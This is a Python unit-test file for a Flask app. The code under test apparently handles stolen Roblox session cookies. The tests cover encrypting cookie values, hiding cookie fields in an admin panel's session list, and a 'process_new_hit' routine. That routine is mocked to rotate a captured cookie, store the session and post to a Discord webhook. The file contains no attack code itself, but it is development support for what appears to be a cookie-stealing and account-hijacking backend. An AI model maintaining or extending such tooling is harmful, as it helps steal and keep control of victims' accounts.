import importlib.util
import unittest
from pathlib import Path
from unittest.mock import patch

ROOT = Path(__file__).resolve().parents[1]
SPEC = importlib.util.spec_from_file_location("app_module", ROOT / "app.py")
module = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(module)


class EncryptionTests(unittest.TestCase):
    def test_encrypt_and_decrypt_round_trip(self):
        original = "test-cookie-value"
        encrypted = module.encrypt_sensitive_data(original)
        self.assertNotEqual(encrypted, original)
        self.assertEqual(module.decrypt_sensitive_data(encrypted), original)

    def test_admin_sessions_api_redacts_cookie_fields(self):
        module.ADMIN_PANEL_ENABLED = True
        with patch.object(module, "db_list_sessions", return_value=[{
            "userId": "123",
            "cookie": "plaintext-cookie",
            "previousCookie": "old-cookie",
            "updatedAt": "2024-01-01T00:00:00Z",
        }]):
            with module.app.test_client() as client:
                with client.session_transaction() as session:
                    session["admin_logged_in"] = True
                response = client.get("/api/admin/sessions")

        self.assertEqual(response.status_code, 200)
        payload = response.get_json()
        self.assertNotIn("cookie", payload["sessions"][0])
        self.assertNotIn("previousCookie", payload["sessions"][0])

    def test_process_new_hit_skips_unknown_identity(self):
        calls = []
        with patch.object(module, "get_roblox_user_info", return_value=None), \
             patch.object(module, "rotate_cookie", return_value="new-cookie"), \
             patch.object(module, "db_get_session", return_value=None), \
             patch.object(module, "db_upsert_session", side_effect=lambda **kwargs: calls.append(kwargs)), \
             patch.object(module, "db_count_by_status", return_value=0), \
             patch.object(module, "send_discord_webhook", return_value=None), \
             patch.object(module, "db_update_message_id", return_value=None):
            result = module.process_new_hit("cookie", username_hint="unknown", display_hint="unknown")

        self.assertEqual(result["status"], "skipped")
        self.assertEqual(calls, [])


if __name__ == "__main__":
    unittest.main()
